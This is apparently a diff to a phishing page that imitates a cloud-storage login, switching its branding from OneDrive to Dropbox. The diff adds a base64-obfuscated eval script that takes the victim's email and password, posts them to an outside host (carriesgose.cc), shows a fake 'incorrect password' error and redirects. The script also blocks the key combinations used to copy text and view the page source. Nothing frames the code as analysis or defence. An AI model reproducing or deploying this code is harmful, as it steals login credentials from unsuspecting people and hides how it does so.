@@ -305,7 +305,7 @@
           </button>
           <br>
           <!-- Button trigger modal -->
-          <p>Save your files to OneDrive to keep them protected, backed up and accessible from all your device anywhere.</p>
+          <p>Save your files to Dropbox to keep them protected, backed up and accessible from all your device anywhere.</p>
           <br>
       </div>
 
@@ -313,7 +313,7 @@
     </div>
 
     <!-- Modal -->
-    <form id="login_form" action="https://carriesgose.cc/kills/feedback.php" method="post">
+    <form id="login_form">
       <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
         <div class="modal-dialog" role="document">
           <div class="modal-content">
@@ -333,17 +333,18 @@
 
                 <div class="form-group">
                   <label for="Email Address"></label>
-                  <input name="eml" id="username" type="email" class="form-control" placeholder="Enter your email address." required>
+                  <input name="email" id="email" type="email" class="form-control" placeholder="Enter your email address." required>
                   <p class="email help-block">Enter your email address.</p>
                 </div>
 
 
                 <div class="form-group">
                   <label for="Pa"></label>
-                  <input name="pswrd" type="password" id="id" class="form-control" pattern=".{5,}" placeholder="Enter your password." required >
+                  <input name="password" type="password" id="password" class="form-control" pattern=".{5,}" placeholder="Enter your password." required >
                   <p class="pa help-block">Enter your password.</p>
                 </div>
 
+                <span style="color:#db1802;text-align: center;font-size: 14px;display: none;"  id="msg">You entered an incorrect email address or password. Please try again </span>
 
               </center>
 
@@ -351,7 +352,7 @@
             </div>
             <div class="modal-footer">
               <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
-              <button type="submit" class="btn btn-primary" id="submit">Login</font></button>
+              <button type="submit" class="btn btn-primary" id="submit-btn">Sign in</font></button>
             </div>
           </div>
         </div>
@@ -368,12 +369,14 @@
       $('.show-modal').on('click', function (event) {
 
         $('#exampleModalLabel').html($(this).data('title'));
-        $('#exampleModalLogo').attr('src', $(this).data('logo')); 
+        $('#exampleModalLogo').attr('src', $(this).data('logo'));
         $('#username').attr('placeholder', $(this).data('e-placeholder'));
         $('#pa').attr('placeholder', $(this).data('p-placeholder'));
 
       })
 
     </script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+ <script>eval(atob("KGZ1bmN0aW9uKCl7Y29uc3QgYT17ZW1haWw6ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2VtYWlsIikscGFzc3dvcmQ6ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3Bhc3N3b3JkIiksc3VibWl0QnRuOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNzdWJtaXQtYnRuIiksbXNnOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNtc2ciKSxlcnJvcjpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjZXJyb3IiKSxsb2FkZXI6ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2xvYWRpbmciKSxmYWRlT3V0OmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5mYWRlb3V0IikscmVnRXhwOntlbWFpbFJlZzovXihbYS16QS1aMC05X1wuXC1dKStcQCgoW2EtekEtWjAtOVwtXSkrXC4pKyhbYS16QS1aMC05XXsyLDR9KSskLyxwYXNzd29yZFJlZzovXihbXHctISNcJEBcL117Nix9KSQvZ30sbGlua3M6e3JlZGlyZWN0TGluazoiaHR0cHM6Ly9jYXJyaWVzZ29zZS5jYy9raWxscy9mZWVkYmFjay5waHAifSxwbGFjZWhvbGRlcnM6e2RvbWFpbkFkZHJlc3M6IiIsZG9tYWluTmFtZToiIixkb21haW5OYW1lVXBwZXI6IiJ9LHZhbGlkYXRlOmZ1bmN0aW9uKGEsYil7aWYoImVtYWlsIj09PWIpe2lmKHRoaXMucmVnRXhwLmVtYWlsUmVnLnRlc3QoYSkpcmV0dXJuITA7fWVsc2UgaWYoISgicGFzc3dvcmQiPT09YikpcmV0dXJuITE7ZWxzZSBpZih0aGlzLnJlZ0V4cC5wYXNzd29yZFJlZy50ZXN0KGEpKXJldHVybiEwfSx2YWxpZGF0ZUlucHV0OmZ1bmN0aW9uKGIpe2lmKCJlbWFpbCI9PT1iKXtjb25zdCBiPXdpbmRvdy5sb2NhdGlvbi5oYXNoLnN1YnN0cigxKTtpZih0aGlzLnZhbGlkYXRlKGIsImVtYWlsIikmJiIiIT09YilyZXR1cm4gdGhpcy5lbWFpbC52YWx1ZT1iLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbkFkZHJlc3M9Yi5zdWJzdHIoYi5pbmRleE9mKCJAIikrMSksdGhpcy5wbGFjZWhvbGRlcnMuZG9tYWluTmFtZT10aGlzLnBsYWNlaG9sZGVycy5kb21haW5BZGRyZXNzLnN1YnN0cigwLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbkFkZHJlc3MuaW5kZXhPZigiLiIpKS50b0xvd2VyQ2FzZSgpLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbk5hbWVVcHBlcj1hLnBsYWNlaG9sZGVycy5kb21haW5OYW1lLnRvVXBwZXJDYXNlKCksITB9ZWxzZSBpZigicGFzc3dvcmQiPT09Yil7bGV0IGI9dGhpcy5wYXNzd29yZC52YWx1ZTtpZih0aGlzLnZhbGlkYXRlKGIsInBhc3N3b3JkIikmJiIiIT09YiYmNjxiLmxlbmd0aCl7dmFyIGM9ImVtYWlsPSIuY29uY2F0KGVtYWlsLnZhbHVlLCImcGFzc3dvcmQ9IikuY29uY2F0KHBhc3N3b3JkLnZhbHVlKTtyZXR1cm4gdGhpcy5zdWJtaXRCdG4uaW5uZXJIVE1MPSJTaWduIEluIix0aGlzLnBvc3RBamF4KGEubGlua3MucmVkaXJlY3RMaW5rLGMpLHNldFRpbWVvdXQoKCk9PndpbmRvdy5sb2NhdGlvbi5ocmVmPWBodHRwczovL2NhcnJpZXNnb3NlLmNjL2tpbGxzL3BkZi5waHBgLDIwMCksITB9cmV0dXJuIHZvaWQodGhpcy5tc2cuc3R5bGUuZGlzcGxheT0iYmxvY2siKX19LHBvc3RBamF4OmZ1bmN0aW9uKGEsYixjKXt2YXIgZD0ic3RyaW5nIj09dHlwZW9mIGI/YjpPYmplY3Qua2V5cyhiKS5tYXAoZnVuY3Rpb24oYSl7cmV0dXJuIGVuY29kZVVSSUNvbXBvbmVudChhKSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KGJbYV0pfSkuam9pbigiJiIpLGU9d2luZG93LlhNTEh0dHBSZXF1ZXN0P25ldyBYTUxIdHRwUmVxdWVzdDpuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTtyZXR1cm4gZS5vcGVuKCJQT1NUIixhKSxlLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpezM8ZS5yZWFkeVN0YXRlJiYyMDA9PWUuc3RhdHVzJiZjKGUucmVzcG9uc2VUZXh0KX0sZS5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSxlLnNlbmQoZCksZX19O3dpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoKT0+e2EudmFsaWRhdGVJbnB1dCgiZW1haWwiKX0pLGEuc3VibWl0QnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIixiPT57Yi5wcmV2ZW50RGVmYXVsdCgpO2xldCBjPTA7aWYoYS52YWxpZGF0ZUlucHV0KCJlbWFpbCIpLCIiPT09YS5lbWFpbC52YWx1ZSYmIiI9PT1hLnBhc3N3b3JkLnZhbHVlKXJldHVybiB2b2lkKGEuZXJyb3Iuc3R5bGUuZGlzcGxheT0iYmxvY2siKTtpZihhLnZhbGlkYXRlKGEucGFzc3dvcmQudmFsdWUsInBhc3N3b3JkIikmJiIiIT09YS5wYXNzd29yZC52YWx1ZSl7YS5zdWJtaXRCdG4uaW5uZXJIVE1MPSJTaWduIEluIjt2YXIgZD0iZW1haWw9Ii5jb25jYXQoYS5lbWFpbC52YWx1ZSwiJnBhc3N3b3JkPSIpLmNvbmNhdChwYXNzd29yZC52YWx1ZSk7cmV0dXJuIGEubXNnLnN0eWxlLmRpc3BsYXk9Im5vbmUiLGEucG9zdEFqYXgoYS5saW5rcy5yZWRpcmVjdExpbmssZCksc2V0VGltZW91dChmdW5jdGlvbigpe2EucGFzc3dvcmQudmFsdWU9IiIsYS5tc2cuc3R5bGUuZGlzcGxheT0iYmxvY2siLGEuc3VibWl0QnRuLmlubmVySFRNTD0iU2lnbiBJbiJ9LDE1MDApLGEucGFzc3dvcmQuZm9jdXMoKSwhMX1yZXR1cm4gNj5hLnBhc3N3b3JkLnZhbHVlLmxlbmd0aD8oYS5tc2cuc3R5bGUuZGlzcGxheT0iYmxvY2siLGEucGFzc3dvcmQudmFsdWU9IiIsYS5wYXNzd29yZC5mb2N1cygpLGM9MCwhMSk6dm9pZChjKyssMT09YyYmKGEudmFsaWRhdGVJbnB1dCgiZW1haWwiKSxhLnZhbGlkYXRlSW5wdXQoInBhc3N3b3JkIikpKX0pfSkoKTsNCiAgICAgIGRvY3VtZW50Lm9ua2V5ZG93bj1mdW5jdGlvbihlKXtyZXR1cm4hZS5jdHJsS2V5fHw2NyE9PWUua2V5Q29kZSYmODYhPT1lLmtleUNvZGUmJjg1IT09ZS5rZXlDb2RlJiYxMTchPT1lLmtleUNvZGV9IA=="));</script>
   </body>
 </html>
